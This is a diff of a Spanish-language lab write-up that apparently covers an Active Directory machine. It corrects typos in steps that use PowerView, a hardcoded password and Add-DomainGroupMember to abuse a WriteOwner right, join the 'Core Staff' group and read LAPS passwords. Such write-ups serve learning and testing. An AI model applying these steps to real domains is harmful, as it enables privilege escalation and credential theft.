@@ -469,12 +469,12 @@ Vemos que le usuario `jdgodd` tiene privilegio `WriteOwner` acceso al grupo `Cor
 Por lo cual podemos añadir a `nikk37` al grupo y después poder listar las credenciales del LAPS
 Subiremos [[POWERVIEW]] a la maquina victima
 
-Lo primero despues de subirlo es importar el modulo
+Lo primero después de subirlo es importar el modulo
 ```shell
 Import-Module .\powerview.ps1
 ```
 
-Ahora tendremos que crear una contraseña y una credencialpara operar como el usuario `Jdgodd`
+Ahora tendremos que crear una contraseña y una credencial para operar como el usuario `Jdgodd`
 ```shell
 $pass = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
 ```
@@ -493,3 +493,5 @@ Add-DomainGroupMember 'Core Staff' -Members 'JDgodd' -Credential $Cred
 ```
 
 Ahora ya podemos listar los LAPS
+
+
